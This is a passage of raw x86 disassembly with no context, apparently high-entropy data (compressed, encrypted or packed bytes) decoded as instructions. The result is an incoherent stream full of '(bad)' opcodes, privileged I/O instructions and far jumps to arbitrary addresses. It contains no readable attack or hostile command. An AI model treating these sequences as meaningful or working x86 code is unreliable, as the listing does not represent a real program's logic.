  411f64:	xor    eax,0xf03963b9
  411f69:	ficom  WORD PTR [esi]
  411f6b:	mov    ebp,0x3c162541
  411f70:	sub    DWORD PTR [esi+edx*1-0x2f],0x62
  411f75:	xchg   ebx,eax
  411f76:	push   eax
  411f77:	pop    ss
  411f78:	(bad)
  411f7c:	ret    0x45e6
  411f7f:	xchg   ebp,eax
  411f80:	mov    eax,0x595d39e8
  411f85:	adc    eax,DWORD PTR [ebp-0x656b3fd]
  411f8b:	mov    bl,0xb3
  411f8d:	pop    ebx
  411f8e:	mov    cl,0x21
  411f90:	lahf   
  411f91:	ret    
  411f92:	mov    eax,ds:0x9f38ef5b
  411f97:	sbb    DWORD PTR [edi-0x244caa56],ebx
  411f9d:	mov    BYTE PTR es:[eax+0x72],ch
  411fa1:	stc    
  411fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa3:	mov    al,0x13
  411fa5:	test   DWORD PTR [edx+0x7967d549],0x8f99be2d
  411faf:	std    
  411fb0:	mov    ds:0xdccec2cf,al
  411fb5:	ja     0x411f8c
  411fb7:	test   eax,0xb696661f
  411fbc:	sbb    al,0x87
  411fbe:	xchg   ebp,eax
  411fbf:	xchg   edi,eax
  411fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc1:	cmc    
  411fc2:	adc    al,0xd1
  411fc4:	sahf   
  411fc5:	or     DWORD PTR [ecx],0xffffffaf
  411fc8:	mov    al,0x4
  411fca:	cmp    al,0x95
  411fcc:	pop    esp
  411fcd:	cmp    BYTE PTR ds:0x499e9761,cl
  411fd3:	hlt    
  411fd4:	retf   0x29db
  411fd7:	ror    ebp,cl
  411fd9:	lds    eax,FWORD PTR [ecx]
  411fdb:	retf   0x8c81
  411fde:	sub    al,0x3d
  411fe0:	lock shl WORD PTR [ebp+0x29],cl
  411fe5:	pop    ebp
  411fe6:	loope  0x41202f
  411fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fe9:	sbb    bh,BYTE PTR [esi]
  411feb:	and    eax,0x11f17621
  411ff0:	lahf   
  411ff1:	add    edx,edx
  411ff3:	(bad)  
  411ff4:	jp     0x412006
  411ff6:	hlt    
  411ff7:	ins    DWORD PTR es:[edi],dx
  411ff8:	xor    DWORD PTR [ebp+0x177d5792],edi
  411ffe:	fiadd  WORD PTR [esi-0x561c9714]
  412004:	pop    ds
  412005:	mov    bl,0x14
  412007:	pop    ds
  412008:	rol    DWORD PTR [ecx],cl
  41200a:	aam    0x1d
  41200c:	pop    edx
  41200d:	sbb    al,BYTE PTR [esi+0x4c]
  412010:	ss popf 
  412012:	cdq    
  412013:	lahf   
  412014:	int3   
  412015:	or     esp,DWORD PTR [ecx+eiz*4+0x7d23e02]
  41201c:	mov    ch,0x8d
  41201e:	dec    ecx
  41201f:	call   DWORD PTR [eax+0x1c210f2a]
  412025:	clc    
  412026:	(bad)  
  412027:	xchg   ebx,eax
  412028:	sahf   
  412029:	xor    BYTE PTR [edi],bh
  41202b:	lods   al,BYTE PTR ds:[esi]
  41202c:	xchg   esi,eax
  41202d:	rol    ebp,1
  41202f:	je     0x411fcd
  412031:	int    0xf6
  412033:	dec    esp
  412034:	je     0x411ff6
  412036:	add    al,0x22
  412038:	push   cs
  412039:	push   eax
  41203a:	popf   
  41203b:	jge    0x4120bc
  41203d:	aaa    
  41203e:	sub    BYTE PTR [eax],ah
  412040:	sub    al,ch
  412042:	jg     0x412094
  412044:	cmc    
  412045:	loop   0x411ffb
  412047:	and    cl,0xb2
  41204a:	jnp    0x41203e
  41204c:	dec    esi
  41204d:	retf   
  41204e:	xlat   BYTE PTR ds:[ebx]
  41204f:	shl    BYTE PTR [edx],cl
  412051:	scas   eax,DWORD PTR es:[edi]
  412052:	adc    ecx,DWORD PTR [edx+0x26]
  412055:	xchg   ebp,eax
  412056:	jge    0x411fe2
  412058:	xchg   ecx,eax
  412059:	xchg   esp,eax
  41205a:	call   0x9406:0x3858279c
  412061:	sti    
  412062:	call   0x8829:0x5573df85
  412069:	fs iret 
  41206b:	push   edx
  41206c:	xchg   BYTE PTR [eax-0x18],dl
  41206f:	jbe    0x412019
  412071:	cmp    DWORD PTR [eax+0x67e24603],esi
  412077:	or     al,0x27
  412079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41207a:	adc    al,0xf7
  41207c:	mov    edx,0x99444a40
  412081:	pushf  
  412082:	ja     0x412057
  412084:	or     al,0x44
  412086:	adc    al,0xf
  412088:	pusha  
  412089:	sub    eax,0x20ac6074
  41208e:	sub    DWORD PTR [edx-0x52],edx
  412091:	sbb    eax,DWORD PTR [edx]
  412093:	lods   al,BYTE PTR ds:[esi]
  412094:	xor    ah,BYTE PTR [edx+esi*4-0x48448d2d]
  41209b:	add    DWORD PTR [esi],0xd2200fad
  4120a1:	jmp    0x8b2c:0xa32f9a54
  4120a8:	or     DWORD PTR [eax+0x21cbfa59],0x9894e9d7
  4120b2:	xchg   esi,eax
  4120b3:	xor    edx,0x1a548ad3
  4120b9:	or     DWORD PTR [edx-0xa],0x3c60dae1
  4120c0:	mov    al,ds:0x96abdf1d
  4120c5:	add    eax,0x2832d259
  4120ca:	cmp    al,0xd7
  4120cc:	xor    dl,dh
  4120ce:	rcl    DWORD PTR [edi-0x65],cl
  4120d1:	out    dx,eax
  4120d2:	mov    dh,0xbd
  4120d4:	ret    
  4120d5:	xchg   BYTE PTR [eax],ch
  4120d7:	adc    eax,0x8ea437a5
  4120dc:	pop    esp
  4120dd:	push   0x2
  4120df:	mov    esp,0x2e00e81d
  4120e4:	sub    eax,0x973621e7
  4120e9:	add    eax,0xf206b0af
  4120ee:	push   0x79b8dc4c
  4120f3:	bound  esi,QWORD PTR ds:0x635e1e93
  4120f9:	js     0x4120f5
  4120fb:	inc    edx
  4120fc:	in     eax,dx
  4120fd:	popa   
  4120fe:	in     eax,dx
  4120ff:	dec    eax
  412100:	mov    al,0xc1
  412102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412103:	shl    BYTE PTR ds:0x4f9c2331,cl
  412109:	pop    ebx
  41210a:	mov    ah,0x10
  41210c:	dec    ecx
  41210d:	add    esi,DWORD PTR [ebp+0x7e]
  412110:	add    BYTE PTR [edx+0x40],cl
  412113:	dec    esi
  412114:	int3   
  412115:	add    edi,esp
  412117:	out    0x15,al
  412119:	inc    esi
  41211a:	outs   dx,DWORD PTR ds:[esi]
  41211b:	scas   eax,DWORD PTR es:[edi]
  41211c:	pop    ebp
  41211d:	or     BYTE PTR [edi-0x5f],0xe5
  412121:	sub    BYTE PTR [ebx+0x4a450359],0x86
  412128:	jg     0x4120b5
  41212a:	add    DWORD PTR [ebx+0x5fae018d],ebx
  412130:	inc    ecx
  412131:	mov    edx,0xa1299cc2
  412136:	imul   ebx,DWORD PTR [ebp+0x62],0xffffffd2
  41213a:	xlat   BYTE PTR ds:[ebx]
  41213b:	lea    eax,[edx]
  41213d:	mov    esi,0x8237b48c
  412142:	adc    al,0xf7
  412144:	xor    ebp,DWORD PTR [ebx]
  412146:	fnstcw WORD PTR [edx+0x690fbd4]
  41214c:	xchg   DWORD PTR [ebp-0x53],ebx
  41214f:	shl    DWORD PTR [ebx],1
  412151:	(bad)  
  412152:	loope  0x412165
  412154:	mov    ah,0x3e
  412156:	and    DWORD PTR [edi+0x29],esp
  412159:	jmp    0x412152
  41215b:	neg    BYTE PTR [ebx-0x4f]
  41215e:	cmp    DWORD PTR [eax+edi*8-0x3e648e29],esi
  412165:	cmp    BYTE PTR [ebx+ecx*1-0x388d1bf],dh
  41216c:	xchg   edx,eax
  41216d:	add    bh,dl
  41216f:	jo     0x4120fd
  412171:	bound  edx,QWORD PTR [ebp-0x7e36585d]
  412177:	addr16 mov ebx,0x4f59bab9
  41217d:	lods   eax,DWORD PTR ds:[esi]
  41217e:	lock dec edx
  412180:	int3   
  412181:	shl    BYTE PTR [ecx-0x17],1
  412184:	das    
  412185:	mov    WORD PTR ds:0xf4cf939f,cs
  41218b:	test   eax,0x4b5e1a7b
  412190:	xor    bh,BYTE PTR [esi-0x52662430]
  412196:	in     eax,0x82
  412198:	xchg   ebp,eax
  412199:	es test al,0x5b
  41219c:	test   al,0x73
  41219e:	inc    esp
  41219f:	imul   edi,eax,0x2e
  4121a2:	push   edi
  4121a3:	int    0xb1
  4121a5:	mov    ds:0x830d7899,al
  4121aa:	int3   
  4121ab:	mov    cl,ah
  4121ad:	jb     0x4121aa
  4121af:	xchg   esp,eax
  4121b0:	xchg   ecx,eax
  4121b1:	ja     0x41221d
  4121b3:	xchg   ebx,eax
  4121b4:	out    dx,eax
  4121b5:	xor    bh,BYTE PTR [ebp-0x6c]
  4121b8:	xor    BYTE PTR [edx*8+0x1567be3e],dl
  4121bf:	addr16 cmp al,0x38
  4121c2:	and    DWORD PTR [edx+0xae61c1d],ebp
  4121c8:	icebp  
  4121c9:	(bad)  
  4121ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121cb:	push   es
  4121cc:	and    edi,esi
  4121ce:	xchg   ecx,eax
  4121cf:	int    0xbd
  4121d1:	mov    ss,WORD PTR cs:[ecx-0x60cb7ad8]
  4121d8:	ss int 0xdd
  4121db:	pop    ds
  4121dc:	mov    esp,0x1129c4bc
  4121e1:	in     eax,dx
  4121e2:	(bad)  
  4121e3:	test   al,0xb6
  4121e5:	repnz cmp eax,0x6dc4a245
  4121eb:	test   edx,esi
  4121ed:	or     BYTE PTR [ebp-0x13],bh
  4121f0:	imul   edi,DWORD PTR [ebx],0x5903f09d
  4121f6:	mov    ch,0x9b
  4121f8:	mov    ebp,0x3219e1cd
  4121fd:	sub    al,al
  4121ff:	dec    ebx
  412200:	push   0x7a560710
  412205:	mov    al,ds:0x17226cfc
  41220a:	or     cl,bl
  41220c:	cmp    BYTE PTR ds:0x450d293a,dl
  412212:	in     al,dx
  412213:	icebp  
  412214:	pop    esi
  412215:	or     BYTE PTR [eax+eiz*4],dl
  412218:	ss (bad) 
  41221a:	aas    
  41221b:	sub    edi,ebp
  41221d:	fimul  WORD PTR [edi]
  41221f:	add    DWORD PTR [edx-0x69],ecx
  412222:	jbe    0x412276
  412224:	adc    BYTE PTR [ecx-0x3f741891],bl
  41222a:	scas   eax,DWORD PTR es:[edi]
  41222b:	adc    eax,0x8a6d0535
  412230:	push   esi
  412231:	mov    ch,0xb0
  412233:	or     ebp,DWORD PTR [ebx-0x4b028b93]
  412239:	mov    esp,0xe572eb26
  41223e:	mov    DWORD PTR [edi],0xdf60b0b6
  412244:	adc    eax,0xcc1697a9
  412249:	jmp    0x4122c7
  41224b:	rdtsc  
  41224d:	rcl    DWORD PTR [edi-0x54ff963f],0xcc
  412254:	dec    ebx
  412255:	jae    0x412254
  412257:	dec    esp
  412258:	(bad)  
  412259:	sub    dh,dh
  41225b:	rcr    DWORD PTR [edx],cl
  41225d:	mov    dl,0x85
  41225f:	pop    ss
  412260:	shl    BYTE PTR [edi],1
  412262:	cwde   
  412263:	int    0x3b
  412265:	mov    ecx,eax
  412267:	mov    ebx,0x5b7e8cc2
  41226c:	jmp    0x9f8febb5
  412271:	jnp    0x412258
  412273:	mov    bl,dh
  412275:	(bad)  
  412276:	adc    al,0x2f
  412278:	mov    al,ds:0xfee50a0f
  41227d:	sbb    eax,0x55cae57b
  412282:	xchg   ebp,eax
  412283:	xor    DWORD PTR [eax-0x62],ecx
  412286:	xor    BYTE PTR gs:[eax],dh
  412289:	jno    0x41228c
  41228b:	addr16 inc esp
  41228d:	jecxz  0x4122fd
  41228f:	pop    ecx
  412290:	jmp    0xa6f9:0x945a5d01
  412297:	fisub  WORD PTR [ecx+0x1816aca9]
  41229d:	int    0x21
  41229f:	xchg   edi,eax
  4122a0:	cmp    al,BYTE PTR ds:0xb7518866
  4122a6:	retf   
  4122a7:	stos   DWORD PTR es:[edi],eax
  4122a8:	push   0xee701daf
  4122ad:	scas   eax,DWORD PTR es:[edi]
  4122ae:	mov    edx,0xdce1e321
  4122b3:	jb     0x412312
  4122b5:	pop    ss
  4122b6:	and    BYTE PTR ds:0x652e2d48,0x3b
  4122bd:	adc    DWORD PTR [edi+0x53],esp
  4122c0:	and    BYTE PTR [ebx+0x78],0xb7
  4122c4:	and    eax,0x4d2ae1be
  4122c9:	push   ds
  4122ca:	xchg   BYTE PTR [eax+0x373e6f9],ch
  4122d0:	dec    eax
  4122d1:	xor    al,0x5d
  4122d3:	adc    dh,BYTE PTR [edx]
  4122d5:	dec    edx
  4122d6:	loope  0x412356
  4122d8:	inc    esp
  4122d9:	idiv   DWORD PTR [esi]
  4122db:	pop    ss
  4122dc:	int3   
  4122dd:	dec    eax
  4122de:	sbb    BYTE PTR [ebx],0x21
  4122e1:	sahf   
  4122e2:	(bad)  
  4122e3:	fsub   DWORD PTR [esi]
  4122e5:	jp     0x412329
  4122e7:	fdiv   QWORD PTR [esi]
  4122e9:	ins    DWORD PTR es:[edi],dx
  4122ea:	aas    
  4122eb:	out    0xe5,eax
  4122ed:	inc    ecx
  4122ee:	aad    0xf0
  4122f0:	lahf   
  4122f1:	mov    fs,WORD PTR [ebx]
  4122f3:	sub    esi,DWORD PTR [esi-0x436201a5]
  4122f9:	sub    bl,dh
  4122fb:	push   esi
  4122fc:	push   0xfffffffd
  4122fe:	mov    edx,DWORD PTR [ebx+0x2]
  412301:	pop    esp
  412302:	js     0x41236e
  412304:	test   DWORD PTR [ebx-0x51077d9f],edi
  41230a:	and    al,0x66
  41230c:	or     bl,BYTE PTR [ebp+0x62]
  41230f:	ins    DWORD PTR es:[edi],dx
  412310:	je     0x41229a
  412312:	int3   
  412313:	in     al,0xd4
  412315:	ja     0x41230c
  412317:	aad    0xaa
  412319:	jbe    0x41231d
  41231b:	mov    bl,0x51
  41231d:	ins    DWORD PTR es:[edi],dx
  41231e:	shl    BYTE PTR [eax+0xa1f0bcf],1
  412324:	mov    ah,0xc2
  412326:	std    
  412327:	push   ds
  412328:	xchg   BYTE PTR [ebp-0x71],dh
  41232b:	cwde   
  41232c:	or     cl,cl
  41232e:	sub    al,0x3
  412330:	dec    ebp
  412331:	mov    bh,0xc5
  412333:	test   BYTE PTR [esi-0x7f7dc564],dh
  412339:	rcr    esi,1
  41233b:	retf   0xd5c6
  41233e:	xchg   BYTE PTR [edi],ch
  412340:	jo     0x41237f
  412342:	push   ds
  412343:	or     esp,esp
  412345:	ins    DWORD PTR es:[edi],dx
  412346:	lock and DWORD PTR [edi+0x35],ebp
  41234a:	clc    
  41234b:	repnz push 0xe1ce0bb5
  412351:	xor    al,0xfc
  412353:	bound  esp,QWORD PTR [esi]
  412355:	mov    ebp,0x8f571a21
  41235a:	shl    esi,cl
  41235c:	xchg   ebp,eax
  41235d:	sbb    BYTE PTR [edx-0x1e],dl
  412360:	cmp    ch,BYTE PTR [ebx]
  412362:	scas   eax,DWORD PTR es:[edi]
  412363:	jl     0x412357
  412365:	popf   
  412366:	jne    0x41235c
  412368:	pop    ebx
  412369:	inc    ebx
  41236a:	xor    al,0xff
  41236c:	or     DWORD PTR [edx-0x677f633a],ebp
  412372:	jno    0x4122f8
  412374:	cmp    BYTE PTR ds:0x724fd34c,0xa6
  41237b:	adc    cl,bl
  41237d:	dec    ebx
  41237e:	ds inc ecx
  412380:	in     al,dx
  412381:	les    ecx,FWORD PTR [edx-0x40]
  412384:	sub    edx,DWORD PTR [esi+0x1d4e7523]
  41238a:	cld    
  41238b:	and    eax,0xa58fd516
  412390:	xor    ebx,DWORD PTR [esi+0x3b]
  412393:	or     al,0xfd
  412395:	mov    esi,0xd74c2acd
  41239a:	or     eax,0x8576b7f5
  41239f:	jecxz  0x41240b
  4123a1:	test   eax,0xfa99dfcc
  4123a6:	shr    DWORD PTR [esi],1
  4123a8:	sbb    ah,BYTE PTR [esi+ecx*1-0x29]
  4123ac:	cmp    esi,eax
  4123ae:	jno    0x412396
  4123b0:	sub    ebp,DWORD PTR [ebp-0x5c]
  4123b3:	mov    ch,BYTE PTR [esp+eax*4]
  4123b6:	pop    ss
  4123b7:	lea    ecx,[esi-0x4a56a488]
  4123bd:	fisub  WORD PTR ds:0xcfc165ec
  4123c3:	je     0x412383
  4123c5:	imul   ebx,DWORD PTR [ecx+eax*2-0x1a43999f],0xd273f992
  4123d0:	mov    cl,0xc0
  4123d2:	add    esp,DWORD PTR [eax+ecx*2-0x72b8ffe5]
  4123d9:	or     al,BYTE PTR [ecx-0x51]
  4123dc:	push   ds
  4123dd:	inc    ecx
  4123de:	ds mov eax,0xa64d9e83
  4123e4:	mov    edx,0x3bf4fae2
  4123e9:	enter  0x29d,0xd1
  4123ed:	bound  ebp,QWORD PTR [edi-0x2f]
  4123f0:	push   cs
  4123f1:	xor    DWORD PTR [ebx-0x2a],ecx
  4123f4:	jp     0x41243c
  4123f6:	push   0x4428cb6f
  4123fb:	mov    edi,0x82f919
  412400:	dec    DWORD PTR [edi]
  412402:	std    
  412403:	ret    0x7ed
  412406:	popa   
  412407:	into   
  412408:	imul   ebp,DWORD PTR [ebx-0x295262e7],0x32
  41240f:	or     al,0x5d
  412411:	or     BYTE PTR ds:0x564ecfa3,0x50
  412418:	dec    edx
  412419:	jmp    0x1559bc6e
  41241e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41241f:	xchg   ecx,eax
  412420:	das    
  412421:	bswap  edi
  412423:	imul   ecx,DWORD PTR [edi+0x5e28072e],0x40
  41242a:	cmc    
  41242b:	(bad)  
  41242d:	mov    eax,ds:0x482b72f9
  412432:	jl     0x4123fe
  412434:	add    al,0x14
  412436:	cmp    ebp,DWORD PTR [ebx]
  412438:	xchg   ebx,eax
  412439:	jecxz  0x41245d
  41243b:	mov    ds:0x89806683,al
  412440:	imul   edi
  412442:	jmp    0xe6e7:0x6225aef3
  412449:	pop    esi
  41244a:	sub    BYTE PTR [eax+eax*8],0x6b
  41244e:	je     0x4124ac
  412450:	sbb    DWORD PTR [eax-0x3cfd6f50],ebp
  412456:	lds    esi,FWORD PTR [edi]
  412458:	add    bh,al
  41245a:	mov    ebp,0x86482868
  41245f:	lods   al,BYTE PTR ds:[esi]
  412460:	cmp    DWORD PTR [edi+0x28],esp
  412463:	adc    BYTE PTR [eax+0x42],bh
  412466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412467:	mov    ebx,esi
  412469:	shr    BYTE PTR [esi+0x5e7ab6f],1
  41246f:	imul   ecx,DWORD PTR [ecx-0x30],0x990844df
  412476:	jp     0x4124f7
  412478:	fadd   st,st(5)
  41247a:	js     0x41246a
  41247c:	test   BYTE PTR [ebx-0x26ca0528],ah
  412482:	fs data16 cmp al,0xb6
  412486:	push   ebp
  412487:	mov    eax,ds:0x46c87f98
  41248c:	jo     0x412478
  41248e:	je     0x41241b
  412490:	xor    eax,DWORD PTR [eax]
  412492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412493:	dec    esp
  412494:	arpl   ax,bp
  412496:	pop    edi
  412497:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  412499:	xlat   BYTE PTR ds:[ebx]
  41249a:	mov    bh,0x18
  41249c:	aaa    
  41249d:	adc    bl,BYTE PTR [esi+0x8bc9d9e]
  4124a3:	popf   
  4124a4:	mov    ds:0x8822a403,eax
  4124a9:	imul   ebp,DWORD PTR [ebx+0x374100c7],0x3a
  4124b0:	xchg   esi,esp
  4124b2:	test   eax,0xd4c5a6d0
  4124b7:	xchg   esi,eax
  4124b8:	cmp    BYTE PTR [edi],ah
  4124ba:	sub    al,dh
  4124bc:	int3   
  4124bd:	xchg   ebx,eax
  4124be:	dec    edi
  4124bf:	rcl    DWORD PTR [eax],1
  4124c1:	sbb    al,0x3a
  4124c3:	xlat   BYTE PTR ds:[ebx]
  4124c4:	dec    esi
  4124c5:	dec    ebx
  4124c6:	bnd je 0x4124f3
  4124c9:	add    al,0xcb
  4124cb:	add    al,0x7b
  4124cd:	sbb    eax,0xb7ec63e8
  4124d2:	or     BYTE PTR [ebp-0xb],al
  4124d5:	inc    esp
  4124d6:	jbe    0x41251c
  4124d8:	test   al,0x90
  4124da:	jg     0x412472
  4124dc:	loop   0x4124fb
  4124de:	pop    eax
  4124df:	mov    ebp,0x7ec2cbff
  4124e4:	xor    ebp,DWORD PTR [eax+0x4953dff1]
  4124ea:	dec    edx
  4124eb:	jb     0x412488
  4124ed:	out    dx,al
  4124ee:	pop    ds
  4124ef:	sub    edx,DWORD PTR [edx+eiz*8-0x65f27bb]
  4124f6:	adc    esp,esi
  4124f8:	add    al,0x18
  4124fa:	into   
  4124fb:	sub    DWORD PTR [edx+0xb],edi
  4124fe:	retf   0x7ab4
  412501:	cmp    ah,dl
  412503:	nop
  412504:	pop    es
  412505:	sub    al,0x84
  412507:	cld    
  412508:	rcl    DWORD PTR [ebx-0x5422a3e8],1
  41250e:	fimul  WORD PTR [edx-0x1e]
  412511:	and    eax,0xd808ac7f
  412516:	xor    ah,al
  412518:	adc    al,0x2c
  41251a:	aaa    
  41251b:	jbe    0x412549
  41251d:	and    DWORD PTR fs:[edi],esp
  412520:	fwait
  412521:	in     eax,0x94
  412523:	add    ecx,DWORD PTR [ebx+ebx*8+0x1526f55b]
  41252a:	push   ebx
  41252b:	div    ebp
  41252d:	mov    ch,0xf9
  41252f:	les    esi,FWORD PTR [edi-0x743dd758]
  412535:	push   0x39
  412537:	sbb    ecx,DWORD PTR [ebx-0xe]
  41253a:	stos   DWORD PTR es:[edi],eax
  41253b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41253c:	inc    ebx
  41253d:	fstp   DWORD PTR [edx]
  41253f:	stc    
  412540:	xor    eax,0x7cf73d62
  412545:	(bad)  
  412546:	mov    WORD PTR ds:0x1a460cb8,cs
  41254c:	jo     0x4124e0
  41254e:	bound  edx,QWORD PTR [ebp-0x23]
  412551:	cmp    al,0x96
  412553:	sbb    esp,ebx
  412555:	xchg   esi,eax
  412556:	jb     0x4125b5
  412558:	mov    ds:0x2133b405,eax
  41255d:	das    
  41255e:	shr    ah,1
  412560:	ins    DWORD PTR es:[edi],dx
  412561:	stos   BYTE PTR es:[edi],al
  412562:	mov    ch,0x62
  412564:	pop    edx
  412565:	pushf  
  412566:	mov    ch,0xcf
  412568:	es pop ds
  41256a:	mov    DWORD PTR [eax-0x3a522a3a],edi
  412570:	mov    edi,edx
  412572:	sbb    eax,DWORD PTR [eax-0x4c8d7fd2]
  412578:	inc    eax
  412579:	std    
  41257a:	lea    ebx,[edi-0x64]
  41257d:	or     ebx,DWORD PTR [esi+eax*4]
  412580:	or     al,0x2e
  412582:	push   ebx
  412583:	rol    DWORD PTR [ebx],cl
  412585:	add    eax,0x422f5b8b
  41258a:	xchg   esi,eax
  41258b:	sbb    eax,0xf3de563
  412590:	xchg   edx,eax
  412591:	sbb    edi,DWORD PTR [eax-0x2f]
  412594:	imul   esp,esp,0xcb758996
  41259a:	inc    ebx
  41259b:	(bad)  
  41259c:	nop
  41259d:	mov    ds:0x692bb868,eax
  4125a2:	add    al,0x5
  4125a4:	ja     0x412594
  4125a6:	xchg   edi,eax
  4125a7:	std    
  4125a8:	pop    esi
  4125a9:	int    0xac
  4125ab:	pop    es
  4125ac:	mov    ah,0xbd
  4125ae:	dec    ebx
  4125af:	xchg   ebp,eax
  4125b0:	ret    0xa9e0
  4125b3:	pop    esi
  4125b4:	iret   
  4125b5:	mov    ebp,0xdcd0a45b
  4125ba:	mov    ah,0xe2
  4125bc:	inc    edx
  4125bd:	fnstcw WORD PTR [esi]
  4125bf:	cwde   
  4125c0:	pop    ss
  4125c1:	rcl    BYTE PTR [ebp-0x36],cl
  4125c4:	lds    ebx,FWORD PTR [ebp-0x5a]
  4125c7:	int    0x88
  4125c9:	cmp    al,0x35
  4125cb:	sbb    BYTE PTR [edi-0x20],ch
  4125ce:	lods   al,BYTE PTR ds:[esi]
  4125cf:	jg     0x412645
  4125d1:	neg    DWORD PTR [eax-0x7d]
  4125d4:	and    eax,0xa02fc20a
  4125d9:	or     eax,0xdfcc9c17
  4125de:	and    esi,DWORD PTR [ebx]
  4125e0:	xchg   esp,eax
  4125e1:	imul   esp,DWORD PTR [eax],0xa3713ee6
  4125e7:	xchg   BYTE PTR [eax],cl
  4125e9:	and    DWORD PTR [ecx+0x77],ebp
  4125ec:	cld    
  4125ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125ee:	sbb    DWORD PTR [edi-0xe20749b],ebp
  4125f4:	fst    QWORD PTR [edi+0x34]
  4125f7:	push   edi
  4125f8:	fisttp WORD PTR [eax+edx*8+0x70f16afa]
  4125ff:	sub    eax,0x564dd399
  412604:	adc    ecx,esp
  412606:	cmp    eax,0xbc0c3a8c
  41260b:	(bad)  
  41260c:	mov    ch,0x2e
  41260e:	lds    esi,FWORD PTR [ebx-0x517b20fe]
  412614:	or     bl,BYTE PTR [eax-0xc]
  412617:	dec    edx
  412618:	jecxz  0x41260e
  41261a:	xor    BYTE PTR [esi],0x90
  41261d:	ret    
  41261e:	(bad)  
  41261f:	fld    QWORD PTR [esi-0x8893137]
  412625:	and    DWORD PTR [ebp+0x5f],esi
  412628:	pop    edx
  412629:	stc    
  41262a:	push   ecx
  41262b:	int3   
  41262c:	dec    ebx
  41262d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41262e:	shl    BYTE PTR [ebx],cl
  412630:	xor    al,0xec
  412632:	idiv   BYTE PTR [esi+0x7e443dfb]
  412638:	mov    cl,0x70
  41263a:	dec    edx
  41263b:	or     DWORD PTR [ebp-0x54],ebx
  41263e:	push   0xe5a18307
  412643:	cwde   
  412644:	sbb    eax,0xb78c10e
  412649:	ins    DWORD PTR es:[edi],dx
  41264a:	jmp    0x412677
  41264c:	imul   ecx,edx,0x26
  41264f:	pop    esi
  412650:	test   eax,0xbda277fa
  412655:	clc    
  412656:	retf   
  412657:	stos   BYTE PTR es:[edi],al
  412658:	add    dh,BYTE PTR cs:[edx+0x32]
  41265c:	pop    edi
  41265d:	out    0x71,al
  41265f:	xor    al,0xda
  412661:	(bad)  
  412662:	fnsave [edx+0x280412aa]
  412668:	fcomp  DWORD PTR [edi+ebp*8]
  41266b:	push   0x79
  41266d:	retf   0xa1a7
  412670:	mov    bl,0xd6
  412672:	jp     0x412670
  412674:	xchg   DWORD PTR [edx],ebx
  412676:	mov    bh,0x23
  412678:	fsub   DWORD PTR [edx+0x38160c4a]
  41267e:	xchg   DWORD PTR [edi],edx
  412680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412681:	aaa    
  412682:	ss jb  0x41265b
  412685:	inc    edx
  412686:	or     bh,0x5
  412689:	fcomp  QWORD PTR [esp+0x45]
  41268d:	jmp    0x6f107010
  412692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412693:	inc    BYTE PTR [ecx+ecx*1]
  412696:	inc    esi
  412697:	and    ecx,DWORD PTR [ebp+0x40dca52f]
  41269d:	jmp    0x412691
  41269f:	test   eax,0x44cc9608
  4126a4:	nop
  4126a5:	push   es
  4126a6:	adc    al,0xbb
  4126a8:	aad    0x5a
  4126aa:	xor    eax,0xe7580e3e
  4126af:	popa   
  4126b0:	dec    ebp
  4126b1:	pushf  
  4126b2:	adc    DWORD PTR [eax+0x386a649e],edx
  4126b8:	add    dh,BYTE PTR [edi]
  4126ba:	ja     0x4126ee
  4126bc:	xchg   ecx,ecx
  4126be:	jecxz  0x412735
  4126c0:	xchg   esp,eax
  4126c1:	and    BYTE PTR [edx+0x35],0x37
  4126c5:	xchg   ebp,eax
  4126c6:	test   DWORD PTR [bp+0x14],eax
  4126ca:	mov    al,ds:0x1176881a
  4126cf:	add    DWORD PTR [edi+esi*4],0x1d
  4126d3:	leave  
  4126d4:	ss push cs
  4126d6:	cmp    al,0x61
  4126d8:	fidiv  DWORD PTR [edx+0x77f765fd]
  4126de:	lock bound edx,QWORD PTR [edx+ebx*1-0x2a]
  4126e3:	xchg   ebp,eax
  4126e4:	fucomi st,st(7)
  4126e6:	cdq    
  4126e7:	inc    edi
  4126e8:	pop    edi
  4126e9:	push   eax
  4126ea:	mov    ah,0x46
  4126ec:	ret    
  4126ed:	ja     0x4126e9
  4126ef:	arpl   WORD PTR [edi+0x48],bp
  4126f2:	jbe    0x4126c9
  4126f4:	xchg   BYTE PTR [edi+eax*8-0x77bc5e52],dl
  4126fb:	lahf   
  4126fc:	sti    
  4126fd:	call   0x7224:0x99442952
  412704:	ror    al,cl
  412706:	xchg   edx,eax
  412707:	cli    
  412708:	stos   BYTE PTR es:[edi],al
  412709:	xor    eax,0xe99e97f4
  41270e:	xchg   DWORD PTR [ebp-0x11b1b715],esp
  412714:	retf   0x8321
  412717:	xchg   ecx,eax
  412718:	xor    BYTE PTR [edx+0x7c83ff82],ch
  41271e:	in     eax,0xa7
  412720:	jl     0x4126c2
  412722:	in     eax,dx
  412723:	mov    ch,0xc9
  412725:	or     eax,0x481a7329
  41272a:	or     ebp,DWORD PTR [ecx]
  41272c:	pusha  
  41272d:	cmovno edx,edx
  412730:	sti    
  412731:	pushf  
  412732:	mov    ebp,0xb50cd210
  412737:	nop
  412738:	shl    DWORD PTR [edi+0x79c657e4],1
  41273e:	xor    BYTE PTR [esi-0x3bc328ce],ah
  412744:	nop
  412745:	adc    al,0x3e
  412747:	ja     0x4126f0
  412749:	pushf  
  41274a:	(bad)  
  41274b:	sahf   
  41274c:	es inc edx
  41274e:	mov    ebp,0xf56592bc
  412753:	xor    edx,DWORD PTR [esi]
  412755:	dec    ebx
  412756:	pop    ecx
  412757:	sbb    edi,edi
  412759:	add    esp,DWORD PTR [ebp-0x80]
  41275c:	cmc    
  41275d:	out    dx,eax
  41275e:	ret    0x4657
